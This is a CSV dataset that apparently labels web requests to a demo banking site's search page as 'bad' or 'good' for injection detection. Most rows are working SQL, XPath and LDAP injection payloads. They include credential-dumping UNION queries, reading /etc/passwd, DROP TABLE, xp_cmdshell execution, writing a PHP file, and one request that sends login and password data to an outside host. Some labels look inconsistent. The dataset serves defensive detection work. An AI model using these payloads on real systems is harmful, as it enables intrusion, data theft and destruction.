path,content,host,class_flag
/search.jsp?query=((1) OR (1 OR 1))--,,demo.testfire.net,['bad']
/search.jsp?query=((1) OR ((1 OR 1)))--,,demo.testfire.net,['bad']
/search.jsp?query=1 OR ((1) OR 1) --,,demo.testfire.net,['bad']
/search.jsp?query=1 OR ((1 OR 1)) --,,demo.testfire.net,['bad']
"/search.jsp?query=(@x OR @y) UNION ALL SELECT name,email,password FROM users-- ",,demo.testfire.net,['bad']
"/search.jsp?query=(@x OR (@y)) UNION ALL SELECT name,email,password FROM users-- ",,demo.testfire.net,['bad']
"/search.jsp?query=((@x) OR @y) UNION ALL SELECT name,email,password FROM users-- ",,demo.testfire.net,['bad']
"/search.jsp?query=@x) OR (@y) UNION ALL SELECT name,email,password FROM users-- ",,demo.testfire.net,['bad']
"/search.jsp?query=(@x) OR (@y) UNION ALL SELECT name,email,password FROM users-- ",,demo.testfire.net,['bad']
"/search.jsp?query=@x OR (@y) UNION ALL SELECT name,email,password FROM users--",,demo.testfire.net,['bad']
/search.jsp?query=(SELECT 1 FROM DUAL),,demo.testfire.net,['bad']
"/search.jsp?query=(SELECT @a FROM DUAL) UNION ALL SELECT 1, 2, 3--",,demo.testfire.net,['bad']
/search.jsp?query=(SELECT (1) FROM DUAL),,demo.testfire.net,['bad']
/search.jsp?query=(select @version from dual),,demo.testfire.net,['bad']
/search.jsp?query=(select (@version - 1) from dual),,demo.testfire.net,['bad']
/search.jsp?query=(select 'foo' from dual),,demo.testfire.net,['bad']
/search.jsp?query=(select ('foo' - 1) from dual),,demo.testfire.net,['bad']
/search.jsp?query=(select 1 foobar from dual),,demo.testfire.net,['bad']
/search.jsp?query=1 and 1 not between 0 and 1,,demo.testfire.net,['bad']
/search.jsp?query=1 AND 1 SOUNDS LIKE 1,,demo.testfire.net,['bad']
/search.jsp?query=1 AND 1 NOT LIKE 0,,demo.testfire.net,['bad']
"/search.jsp?query='-(1 or 1) and 1=0 union select load_file('/etc/passwd'),credit_card,password from users-- -",,demo.testfire.net,['bad']
/search.jsp?query='-(-1 or -1) and 1=0 union,,demo.testfire.net,['bad']
/search.jsp?query='-(-(1) or -1) and 1=0 union,,demo.testfire.net,['bad']
/search.jsp?query='-((1) or -1) and 1=0 union,,demo.testfire.net,['bad']
"/search.jsp?query=-1 union select null, xmlagg(xmlelement(""user"",login || ':' || pass).getStringVal() from users;",,demo.testfire.net,['bad']
"/search.jsp?query=-1 union select null, listagg(login || ':' || pass,', ') within group (order by login) from users;",,demo.testfire.net,['bad']
"/search.jsp?query=-1 union select null, stragg(login || ':' || pass ||', ') from users;",,demo.testfire.net,['bad']
"/search.jsp?query=-1 union select listagg(login || ':' || pass,', ') within group (order by login) from users;                  ",,demo.testfire.net,['bad']
"/search.jsp?query=users.id
#asd
union
#asd
select
#asd
--a-
#aaa
aa+
#asd
--a-
#aaa
from
#asd
--a-
#aaa
asdasd",,demo.testfire.net,['bad']
/search.jsp?query=1'=sleep(1)='1                            ,,demo.testfire.net,['bad']
"/search.jsp?query=1 and select (utl_http.request('http://client9.com/') || select listagg(login || chr(58) || pass || ', ') within group (order by login) from dual) is not null;",,demo.testfire.net,['bad']
"/search.jsp?query=-1 union select top 1 null, lead(pass, 0) over (order by pass) from users;",,demo.testfire.net,['bad']
"/search.jsp?query=-1 union select null, array_to_json(array_agg(users))::text from users limit 1;",,demo.testfire.net,['bad']
/search.jsp?query=1 and (select array_to_json(array_agg(users))::text::bool from users limit 1;,,demo.testfire.net,['bad']
"/search.jsp?query=' UNION SELECT 0x14CmsVwmDJfsa7wFVp24rwqH7z4MMjZVYN545b227272225d293b3f3e,null,null,null,null,null,null,null,null,null,null,null,null,null INTO OUTFILE 'afile.php'",,demo.testfire.net,['bad']
"/search.jsp?query=IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|""XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR""*/",,demo.testfire.net,['bad']
/search.jsp?query=1 and true; BEGIN DECLARE @xy varchar(8000),,demo.testfire.net,['bad']
/search.jsp?query=1; BEGIN DECLARE @xy varchar(8000),,demo.testfire.net,['bad']
/search.jsp?query=x' and 1 = 0; BEGIN DECLARE,,demo.testfire.net,['bad']
/search.jsp?query=x' AND 1=0; DROP TABLE TMP_DB;,,demo.testfire.net,['bad']
/search.jsp?query=' AND 1=0; DECLARE @S VARCHAR(4000) SET @S,,demo.testfire.net,['bad']
/search.jsp?query=' IF EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE,,demo.testfire.net,['bad']
"/search.jsp?query=(--- 0)'=(currenT_user()-3) union select 1,2,3 from users; -- -",,demo.testfire.net,['bad']
/search.jsp?query=1=1 AND-+-+-+-+~~((1)),,demo.testfire.net,['bad']
/search.jsp?query=1-- foo sp_password,,demo.testfire.net,['bad']
/search.jsp?query=1'--sp_password,,demo.testfire.net,['bad']
/search.jsp?query=b'1' UNION SELECT 1,,demo.testfire.net,['bad']
"/search.jsp?query=foo' Eqv StrComp(username, 0x12+0x34+0xab+0xcd,0) Imp 'a",,demo.testfire.net,['good']
/search.jsp?query=x'1' UNION SELECT 1,,demo.testfire.net,['bad']
/search.jsp?query=n'1' UNION SELECT 1,,demo.testfire.net,['bad']
/search.jsp?query=1 having (1) limit 1 union select 1--,,demo.testfire.net,['bad']
/search.jsp?query=1 having 1 limit 1 union select 1--,,demo.testfire.net,['bad']
/search.jsp?query=1 having -(1) limit 1 union select 1--,,demo.testfire.net,['bad']
/search.jsp?query=1 having sin(1) limit 1 union select 1--,,demo.testfire.net,['bad']
/search.jsp?query=1 having 1 limit 2 group by 3 union select 1--,,demo.testfire.net,['bad']
/search.jsp?query=1 group by 2 union select 1 --,,demo.testfire.net,['bad']
/search.jsp?query=sin(1) group by 1 union select 1--,,demo.testfire.net,['bad']
/search.jsp?query=@version group by (-1) union select 1--,,demo.testfire.net,['bad']
/search.jsp?query=@version group by 1 union select 1--,,demo.testfire.net,['bad']
/search.jsp?query=(@version) group by -1 union select 1--,,demo.testfire.net,['bad']
/search.jsp?query=(@version) group by (-1) union select 1--,,demo.testfire.net,['bad']
/search.jsp?query=(@version)) group by (-1) union select 1--,,demo.testfire.net,['bad']
/search.jsp?query=(1)) group by (-1) union select 1--,,demo.testfire.net,['bad']
/search.jsp?query=(@version) group by sin(-1) union select 1--,,demo.testfire.net,['bad']
/search.jsp?query=1 group by sin(1) union select 1--,,demo.testfire.net,['bad']
/search.jsp?query=1 group by 1 - sin(1) union select 1--,,demo.testfire.net,['bad']
/search.jsp?query=1 group by (sin(1)) union select 1--,,demo.testfire.net,['bad']
/search.jsp?query=-1 group by -(-sin(1)) union select 1--,,demo.testfire.net,['bad']
/search.jsp?query=sin(1) group by (-sin(1)) union select 1--,,demo.testfire.net,['bad']
/search.jsp?query=sin(1)-1 group by (-sin(1)) union select 1--,,demo.testfire.net,['bad']
/search.jsp?query=sin(1)-1 group by 1 union select 1--,,demo.testfire.net,['bad']
/search.jsp?query=1 group by ((1)) union select 1--,,demo.testfire.net,['bad']
/search.jsp?query=1 group by (((1))) union select 1--,,demo.testfire.net,['bad']
/search.jsp?query=((1)) group by (1) union select 1--,,demo.testfire.net,['bad']
/search.jsp?query=(1) group by ((1)) union select 1--,,demo.testfire.net,['bad']
/search.jsp?query=(1) group by (1) union select 1--,,demo.testfire.net,['bad']
/search.jsp?query=-(1) is not unknown having 1 order by 1 limit 1 for update  UNION select table_name from information_schema.tables limit 1,,demo.testfire.net,['bad']
/search.jsp?query=-(1) is not unknown  UNION select table_name from information_schema.tables limit 1,,demo.testfire.net,['bad']
/search.jsp?query=-(1) is not unknown having 1 order by 1 limit 1  UNION select table_name from information_schema.tables limit 1,,demo.testfire.net,['bad']
/search.jsp?query=-(1) is not unknown  for update  UNION select table_name from information_schema.tables limit 1,,demo.testfire.net,['bad']
/search.jsp?query=-(1) is not unknown having 1  UNION select table_name from information_schema.tables limit 1,,demo.testfire.net,['bad']
/search.jsp?query=-(1) is not unknown UNION select table_name from information_schema.tables limit 1,,demo.testfire.net,['bad']
/search.jsp?query=-(1) is not unknown having 1 UNION select table_name from information_schema.tables limit 1,,demo.testfire.net,['bad']
/search.jsp?query=-(1) is unknown having 1 UNION select table_name from information_schema.tables limit 1,,demo.testfire.net,['bad']
/search.jsp?query=-(1) for update  UNION select table_name from information_schema.tables limit 1,,demo.testfire.net,['bad']
/search.jsp?query=1 for update UNION select table_name from information_schema.tables limit 1,,demo.testfire.net,['bad']
/search.jsp?query=-(1) for update UNION select table_name from information_schema.tables limit 1,,demo.testfire.net,['bad']
/search.jsp?query=-(true) for update UNION select table_name from information_schema.tables limit 1,,demo.testfire.net,['bad']
/search.jsp?query=-(null) for update UNION select table_name from information_schema.tables limit 1,,demo.testfire.net,['bad']
/search.jsp?query=-(\N) for update UNION select table_name from information_schema.tables limit 1,,demo.testfire.net,['bad']
/search.jsp?query=-(\N) for update having true UNION select table_name from information_schema.tables limit 1,,demo.testfire.net,['bad']
/search.jsp?query=-(\N) for update having 1 UNION select table_name from information_schema.tables limit 1,,demo.testfire.net,['bad']
/search.jsp?query=-(1) for update having 1 UNION select table_name from information_schema.tables limit 1,,demo.testfire.net,['bad']
/search.jsp?query=-(1)  having 1 for updateUNION select table_name from information_schema.tables limit 1,,demo.testfire.net,['bad']
/search.jsp?query=-(1)  having 1 for update UNION select table_name from information_schema.tables limit 1,,demo.testfire.net,['bad']
/search.jsp?query=-(1) having 1 for update UNION select table_name from information_schema.tables limit 1,,demo.testfire.net,['bad']
/search.jsp?query=\''; DROP TABLE users; --,,demo.testfire.net,['bad']
/search.jsp?query=\''); DROP TABLE users; --,,demo.testfire.net,['bad']
/search.jsp?query=\''; /* one */ ;DROP TABLE users; --,,demo.testfire.net,['bad']
/search.jsp?query=\''; select 1; drop table users; --,,demo.testfire.net,['bad']
/search.jsp?query=1; USE master; EXEC xp_cmdshell 'copy c:\SQLbcks\AdvWorks.bck,,demo.testfire.net,['bad']
/search.jsp?query=1; EXECUTE AS LOGIN 'root'; GO xp_cmdshell 'whoami.exe' ; REVERT ;,,demo.testfire.net,['bad']
/search.jsp?query=1; USE master; EXEC xp_cmdshell 'copy c:\SQLbcks\AdvWorks.bck,,demo.testfire.net,['bad']
/search.jsp?query=1); USE master; EXEC xp_cmdshell 'copy c:\SQLbcks\AdvWorks.bck,,demo.testfire.net,['bad']
/search.jsp?query=EXEC sp_add_job @job_name = 'TestJob';,,demo.testfire.net,['bad']
/search.jsp?query=EXECUTE sp_add_job @job_name = 'TestJob';,,demo.testfire.net,['bad']
/search.jsp?query=1;EXECUTE sp_add_job @job_name = 'TestJob';,,demo.testfire.net,['bad']
/search.jsp?query=1;print 'foo'; exec xp_cmdshell 'destroy';,,demo.testfire.net,['bad']
/search.jsp?query=-1 - (select 1) - union all select 2 --,,demo.testfire.net,['bad']
/search.jsp?query=-1 - (select (1 - select (select 1))) union all select 2 --,,demo.testfire.net,['bad']
/search.jsp?query=(select 1) - 1 union all select 2 --,,demo.testfire.net,['bad']
/search.jsp?query=((select 1) - 1) + (select 1) union all select 2 --,,demo.testfire.net,['bad']
/search.jsp?query=(select (select (select 1))) union all select 2 --,,demo.testfire.net,['bad']
/search.jsp?query=(select (select (select 1))) union all select 2 --,,demo.testfire.net,['bad']
/search.jsp?query=(select ((select (select 1))) union all select 2 --,,demo.testfire.net,['bad']
/search.jsp?query=(select (select ((select 1))) union all select 2 --,,demo.testfire.net,['bad']
/search.jsp?query=(select ((select 1 - (select 1))) union all select 2 --,,demo.testfire.net,['bad']
/search.jsp?query=(select (select (((select 1))) union all select 2 --,,demo.testfire.net,['bad']
/search.jsp?query=(select ((select (select 1))) union all select 2 --,,demo.testfire.net,['bad']
/search.jsp?query=(select (select (1 - select 1))) union all select 2 --,,demo.testfire.net,['bad']
/search.jsp?query=(select (((select (select 1))) union all select 2 --,,demo.testfire.net,['bad']
/search.jsp?query=(select (select 1 - (select 1))) union all select 2 --,,demo.testfire.net,['bad']
/search.jsp?query=(select 1 - (select 1 - (select 1))) union all select 2 --,,demo.testfire.net,['bad']
/search.jsp?query=-1 union distinct select table_name from information_schema.tables,,demo.testfire.net,['bad']
/search.jsp?query=password,,demo.testfire.net,['bad']
/search.jsp?query=admin,,demo.testfire.net,['good']
/search.jsp?query=1234,,demo.testfire.net,['good']
/search.jsp?query=123456,,demo.testfire.net,['good']
/search.jsp?query=root,,demo.testfire.net,['good']
/search.jsp?query=toor,,demo.testfire.net,['bad']
/search.jsp?query=test,,demo.testfire.net,['good']
/search.jsp?query=guest,,demo.testfire.net,['good']
/search.jsp?query=' or '1'='1,,demo.testfire.net,['bad']
/search.jsp?query=' or ''=',,demo.testfire.net,['bad']
/search.jsp?query=' or 1] ,,demo.testfire.net,['bad']
/search.jsp?query=' or /* or ',,demo.testfire.net,['bad']
"/search.jsp?query=' or ""a"" or '",,demo.testfire.net,['bad']
/search.jsp?query=' or 1 or ',,demo.testfire.net,['bad']
/search.jsp?query=' or true() or ',,demo.testfire.net,['bad']
/search.jsp?query='or string-length(name(.))<10 or',,demo.testfire.net,['bad']
"/search.jsp?query='or contains(name,'adm') or'",,demo.testfire.net,['bad']
"/search.jsp?query='or contains(.,'adm') or'",,demo.testfire.net,['bad']
/search.jsp?query='or position()=2 or',,demo.testfire.net,['bad']
/search.jsp?query=admin' or ',,demo.testfire.net,['bad']
/search.jsp?query=admin' or '1'='2,,demo.testfire.net,['bad']
/search.jsp?query=*,,demo.testfire.net,['bad']
/search.jsp?query=*)(&,,demo.testfire.net,['bad']
/search.jsp?query=pwd),,demo.testfire.net,['good']
/search.jsp?query=*)(|(&,,demo.testfire.net,['bad']
/search.jsp?query=*)(|(*,,demo.testfire.net,['bad']
/search.jsp?query=*)) ,,demo.testfire.net,['bad']
/search.jsp?query=admin)(&),,demo.testfire.net,['good']
/search.jsp?query=pwd,,demo.testfire.net,['good']
/search.jsp?query=admin)(!(&(|,,demo.testfire.net,['good']
/search.jsp?query=pwd)),,demo.testfire.net,['good']
/search.jsp?query=admin))(|(|,,demo.testfire.net,['good']
/search.jsp?query='-',,demo.testfire.net,['good']
/search.jsp?query=1234,,demo.testfire.net,['good']
/search.jsp?query=' ',,demo.testfire.net,['good']
/search.jsp?query='^',,demo.testfire.net,['good']
/search.jsp?query='&',,demo.testfire.net,['good']
/search.jsp?query='*',,demo.testfire.net,['bad']
/search.jsp?query=' or '' ',,demo.testfire.net,['bad']
/search.jsp?query=' or ''-',,demo.testfire.net,['bad']
/search.jsp?query=' or ''&',,demo.testfire.net,['bad']
/search.jsp?query=' or ''^',,demo.testfire.net,['bad']
/search.jsp?query=' or ''*',,demo.testfire.net,['bad']
"/search.jsp?query=""-""",,demo.testfire.net,['good']
"/search.jsp?query=""&""",,demo.testfire.net,['good']
"/search.jsp?query="" """,,demo.testfire.net,['good']
"/search.jsp?query=""^""",,demo.testfire.net,['good']
"/search.jsp?query=""*""",,demo.testfire.net,['bad']
"/search.jsp?query="" or """" """,,demo.testfire.net,['bad']
"/search.jsp?query="" or """"-""",,demo.testfire.net,['bad']
"/search.jsp?query="" or """"^""",,demo.testfire.net,['bad']
"/search.jsp?query="" or """"&""",,demo.testfire.net,['bad']
"/search.jsp?query="" or """"*""",,demo.testfire.net,['bad']
/search.jsp?query=or true--,,demo.testfire.net,['bad']
/search.jsp?query=' or true--,,demo.testfire.net,['bad']
"/search.jsp?query="" or true--",,demo.testfire.net,['bad']
/search.jsp?query=') or true--,,demo.testfire.net,['bad']
/search.jsp?query=' or 'x'='x,,demo.testfire.net,['bad']
/search.jsp?query=') or ('x')=('x,,demo.testfire.net,['bad']
/search.jsp?query=')) or (('x'))=(('x,,demo.testfire.net,['bad']
"/search.jsp?query="") or true--",,demo.testfire.net,['bad']
"/search.jsp?query="" or ""x""=""x",,demo.testfire.net,['bad']
"/search.jsp?query="") or (""x"")=(""x",,demo.testfire.net,['bad']
"/search.jsp?query="")) or ((""x""))=((""x",,demo.testfire.net,['bad']
/search.jsp?query=or 1=1,,demo.testfire.net,['bad']
/search.jsp?query=or 1=1--,,demo.testfire.net,['bad']
/search.jsp?query=or 1=1#,,demo.testfire.net,['bad']
/search.jsp?query=or 1=1/*,,demo.testfire.net,['bad']
/search.jsp?query=admin' --,,demo.testfire.net,['bad']
/search.jsp?query=admin' #,,demo.testfire.net,['good']
/search.jsp?query=admin'/*,,demo.testfire.net,['bad']
/search.jsp?query=admin' or '1'='1,,demo.testfire.net,['bad']
/search.jsp?query=admin' or '1'='1'--,,demo.testfire.net,['bad']
/search.jsp?query=admin' or '1'='1'#,,demo.testfire.net,['bad']
/search.jsp?query=admin'or 1=1 or ''=',,demo.testfire.net,['bad']
/search.jsp?query=admin' or '1'='1'/*,,demo.testfire.net,['bad']
/search.jsp?query=admin' or 1=1,,demo.testfire.net,['bad']
/search.jsp?query=admin' or 1=1--,,demo.testfire.net,['bad']
/search.jsp?query=admin' or 1=1#,,demo.testfire.net,['bad']
/search.jsp?query=admin' or 1=1/*,,demo.testfire.net,['bad']
/search.jsp?query=admin') or ('1'='1,,demo.testfire.net,['bad']
/search.jsp?query=admin') or ('1'='1'--,,demo.testfire.net,['bad']
/search.jsp?query=admin') or ('1'='1'#,,demo.testfire.net,['bad']
/search.jsp?query=admin') or ('1'='1'/*,,demo.testfire.net,['bad']
/search.jsp?query=admin') or '1'='1,,demo.testfire.net,['bad']
/search.jsp?query=admin') or '1'='1'--,,demo.testfire.net,['bad']
/search.jsp?query=admin') or '1'='1'#,,demo.testfire.net,['bad']
/search.jsp?query=admin') or '1'='1'/*,,demo.testfire.net,['bad']
"/search.jsp?query=1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",,demo.testfire.net,['bad']
"/search.jsp?query=1234 ' AND 1=0 UNION ALL SELECT 'admin', '7110eda4d09e062aa5e4a390b0a572ac0d2c0220",,demo.testfire.net,['bad']
"/search.jsp?query=admin"" --",,demo.testfire.net,['bad']
"/search.jsp?query=admin"" #",,demo.testfire.net,['good']
"/search.jsp?query=admin""/*",,demo.testfire.net,['bad']
"/search.jsp?query=admin"" or ""1""=""1",,demo.testfire.net,['bad']
"/search.jsp?query=admin"" or ""1""=""1""--",,demo.testfire.net,['bad']
"/search.jsp?query=admin"" or ""1""=""1""/*",,demo.testfire.net,['bad']
"/search.jsp?query=admin"" or ""1""=""1""#",,demo.testfire.net,['bad']
"/search.jsp?query=admin""or 1=1 or """"=""",,demo.testfire.net,['bad']
"/search.jsp?query=admin"" or 1=1",,demo.testfire.net,['bad']
"/search.jsp?query=admin"" or 1=1--",,demo.testfire.net,['bad']
"/search.jsp?query=admin"" or 1=1#",,demo.testfire.net,['bad']
"/search.jsp?query=admin"" or 1=1/*",,demo.testfire.net,['bad']
"/search.jsp?query=admin"") or (""1""=""1",,demo.testfire.net,['bad']
"/search.jsp?query=admin"") or (""1""=""1""--",,demo.testfire.net,['bad']
"/search.jsp?query=admin"") or (""1""=""1""#",,demo.testfire.net,['bad']
"/search.jsp?query=admin"") or (""1""=""1""/*",,demo.testfire.net,['bad']
"/search.jsp?query=admin"") or ""1""=""1",,demo.testfire.net,['bad']
"/search.jsp?query=admin"") or ""1""=""1""--",,demo.testfire.net,['bad']
"/search.jsp?query=admin"") or ""1""=""1""#",,demo.testfire.net,['bad']
"/search.jsp?query=admin"") or ""1""=""1""/*",,demo.testfire.net,['bad']
"/search.jsp?query=1234 "" AND 1=0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",,demo.testfire.net,['bad']
"/search.jsp?query=1234 "" AND 1=0 UNION ALL SELECT ""admin"", ""7110eda4d09e062aa5e4a390b0a572ac0d2c0220",,demo.testfire.net,['bad']
/search.jsp?query===,,demo.testfire.net,['good']
/search.jsp?query=',,demo.testfire.net,['good']
/search.jsp?query==,,demo.testfire.net,['good']
/search.jsp?query=' --,,demo.testfire.net,['bad']
/search.jsp?query=' #,,demo.testfire.net,['good']
/search.jsp?query=' ,,demo.testfire.net,['good']
/search.jsp?query='--,,demo.testfire.net,['bad']
/search.jsp?query='/*,,demo.testfire.net,['bad']
/search.jsp?query='#,,demo.testfire.net,['good']
"/search.jsp?query="" --",,demo.testfire.net,['bad']
"/search.jsp?query="" #",,demo.testfire.net,['good']
"/search.jsp?query=""/*",,demo.testfire.net,['bad']
/search.jsp?query=' and 1='1,,demo.testfire.net,['bad']
/search.jsp?query=' and a='a,,demo.testfire.net,['bad']
/search.jsp?query=or true,,demo.testfire.net,['bad']
/search.jsp?query=' or ''=',,demo.testfire.net,['bad']
"/search.jsp?query="" or """"=""",,demo.testfire.net,['bad']
"/search.jsp?query=' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055",,demo.testfire.net,['bad']
/search.jsp?query=12) and '12='1,,demo.testfire.net,['bad']
"/search.jsp?query="" AND 1=0 UNION ALL SELECT """", ""81dc9bdb52d04dc20036dbd8313ed055",,demo.testfire.net,['bad']
"/search.jsp?query="" AND 1=0 UNION ALL SELECT """", ""7110eda4d09e062aa5e4a390b0a572ac0d2c0220",,demo.testfire.net,['bad']
"/search.jsp?query=' AND 1=0 UNION ALL SELECT '', '7110eda4d09e062aa5e4a390b0a572ac0d2c0220",,demo.testfire.net,['bad']
/search.jsp?query=and 1=1,,demo.testfire.net,['bad']
/search.jsp?query=and 1=1,,demo.testfire.net,['bad']
/search.jsp?query=' and 'one'='one,,demo.testfire.net,['bad']
/search.jsp?query=' and 'one'='one,,demo.testfire.net,['bad']
/search.jsp?query=' group by password having 1=1--,,demo.testfire.net,['bad']
/search.jsp?query=' group by userid having 1=1--,,demo.testfire.net,['bad']
/search.jsp?query=' group by username having 1=1--,,demo.testfire.net,['bad']
/search.jsp?query=like '%',,demo.testfire.net,['bad']
/search.jsp?query=or 0=0 --,,demo.testfire.net,['bad']
/search.jsp?query=or 0=0 #,,demo.testfire.net,['bad']
/search.jsp?query=or 0=0 ,,demo.testfire.net,['bad']
/search.jsp?query=' or         0=0 #,,demo.testfire.net,['bad']
/search.jsp?query=' or 0=0 --,,demo.testfire.net,['bad']
/search.jsp?query=' or 0=0 #,,demo.testfire.net,['bad']
/search.jsp?query=' or 0=0 ,,demo.testfire.net,['bad']
"/search.jsp?query="" or 0=0 --",,demo.testfire.net,['bad']
"/search.jsp?query="" or 0=0 #",,demo.testfire.net,['bad']
"/search.jsp?query="" or 0=0 ",,demo.testfire.net,['bad']
/search.jsp?query=%' or '0'='0,,demo.testfire.net,['bad']
/search.jsp?query=or 1=1,,demo.testfire.net,['bad']
/search.jsp?query=' or 1=1--,,demo.testfire.net,['bad']
/search.jsp?query=' or '1'='1,,demo.testfire.net,['bad']
/search.jsp?query=' or '1'='1'--,,demo.testfire.net,['bad']
/search.jsp?query=' or '1'='1'/*,,demo.testfire.net,['bad']
/search.jsp?query=' or '1'='1'#,,demo.testfire.net,['bad']
/search.jsp?query=' or '12='1,,demo.testfire.net,['bad']
/search.jsp?query=' or 1=1,,demo.testfire.net,['bad']
/search.jsp?query=' or 1=1 --,,demo.testfire.net,['bad']
/search.jsp?query=' or 1=1 ,,demo.testfire.net,['bad']
/search.jsp?query=' or 1=1;#,,demo.testfire.net,['bad']
/search.jsp?query=' or 1=1/*,,demo.testfire.net,['bad']
/search.jsp?query=' or 1=1#,,demo.testfire.net,['bad']
/search.jsp?query=' or 1=1,,demo.testfire.net,['bad']
/search.jsp?query=') or '1'='1,,demo.testfire.net,['bad']
/search.jsp?query=') or '1'='1--,,demo.testfire.net,['bad']
/search.jsp?query=') or '1'='1'--,,demo.testfire.net,['bad']
/search.jsp?query=') or '1'='1'/*,,demo.testfire.net,['bad']
/search.jsp?query=') or '1'='1'#,,demo.testfire.net,['bad']
/search.jsp?query=') or ('1'='1,,demo.testfire.net,['bad']
/search.jsp?query=') or ('1'='1--,,demo.testfire.net,['bad']
/search.jsp?query=') or ('1'='1'--,,demo.testfire.net,['bad']
/search.jsp?query=') or ('1'='1'/*,,demo.testfire.net,['bad']
/search.jsp?query=') or ('1'='1'#,,demo.testfire.net,['bad']
/search.jsp?query='or'1=1,,demo.testfire.net,['bad']
/search.jsp?query='or'1=12,,demo.testfire.net,['bad']
"/search.jsp?query="" or ""1""=""1""--",,demo.testfire.net,['bad']
"/search.jsp?query="" or ""1""=""1""/*",,demo.testfire.net,['bad']
"/search.jsp?query="" or ""1""=""1",,demo.testfire.net,['bad']
"/search.jsp?query="" or ""1""=""1""#",,demo.testfire.net,['bad']
"/search.jsp?query="" or 1=1",,demo.testfire.net,['bad']
"/search.jsp?query="" or 1=1 --",,demo.testfire.net,['bad']
"/search.jsp?query="" or 1=1 ",,demo.testfire.net,['bad']
"/search.jsp?query="" or 1=1/*",,demo.testfire.net,['bad']
"/search.jsp?query="" or 1=1--",,demo.testfire.net,['bad']
"/search.jsp?query="" or 1=1#",,demo.testfire.net,['bad']
"/search.jsp?query="" or 1=1",,demo.testfire.net,['bad']
"/search.jsp?query="") or ""1""=""1",,demo.testfire.net,['bad']
"/search.jsp?query="") or ""1""=""1""/*",,demo.testfire.net,['bad']
"/search.jsp?query="") or ""1""=""1""--",,demo.testfire.net,['bad']
"/search.jsp?query="") or ""1""=""1""#",,demo.testfire.net,['bad']
"/search.jsp?query="") or (""1""=""1",,demo.testfire.net,['bad']
"/search.jsp?query="") or (""1""=""1""--",,demo.testfire.net,['bad']
"/search.jsp?query="") or (""1""=""1""/*",,demo.testfire.net,['bad']
"/search.jsp?query="") or (""1""=""1""#",,demo.testfire.net,['bad']
/search.jsp?query=) or '12='1,,demo.testfire.net,['bad']
/search.jsp?query=) or ('12='1,,demo.testfire.net,['bad']
/search.jsp?query=' or 1=1 LIMIT 1;#,,demo.testfire.net,['bad']
/search.jsp?query='or 1=1 or ''=',,demo.testfire.net,['bad']
"/search.jsp?query=""or 1=1 or """"=""",,demo.testfire.net,['bad']
/search.jsp?query=' or a=a--,,demo.testfire.net,['bad']
/search.jsp?query=' or a=a,,demo.testfire.net,['bad']
"/search.jsp?query="" or ""a""=""a",,demo.testfire.net,['bad']
"/search.jsp?query="") or (""a""=""a",,demo.testfire.net,['bad']
"/search.jsp?query=') or ('a'='a and hi"") or (""a""=""a",,demo.testfire.net,['bad']
/search.jsp?query=' or 'one'='one,,demo.testfire.net,['bad']
/search.jsp?query=' or 'one'='one,,demo.testfire.net,['bad']
/search.jsp?query=' or uid like '%,,demo.testfire.net,['bad']
/search.jsp?query=' or uname like '%,,demo.testfire.net,['bad']
/search.jsp?query=' or userid like '%,,demo.testfire.net,['bad']
/search.jsp?query=' or user like '%,,demo.testfire.net,['bad']
/search.jsp?query=' or username like '%,,demo.testfire.net,['bad']
/search.jsp?query=') or ('x'='x,,demo.testfire.net,['bad']
/search.jsp?query=' OR 'x'='x'#;,,demo.testfire.net,['bad']
/search.jsp?query='=' 'or' and '=' 'or',,demo.testfire.net,['bad']
"/search.jsp?query=' UNION ALL SELECT 1, @@version;#",,demo.testfire.net,['bad']
"/search.jsp?query=' UNION ALL SELECT system_user(),user();#",,demo.testfire.net,['bad']
"/search.jsp?query=' UNION select table_schema,table_name FROM information_Schema.tables;#",,demo.testfire.net,['bad']
"/search.jsp?query=admin' and substring(password/text(),1,1)='7",,demo.testfire.net,['bad']
"/search.jsp?query=' and substring(password/text(),1,1)='7",,demo.testfire.net,['bad']
"/search.jsp?query=""",,demo.testfire.net,['good']
/search.jsp?query='-- 2,,demo.testfire.net,['bad']
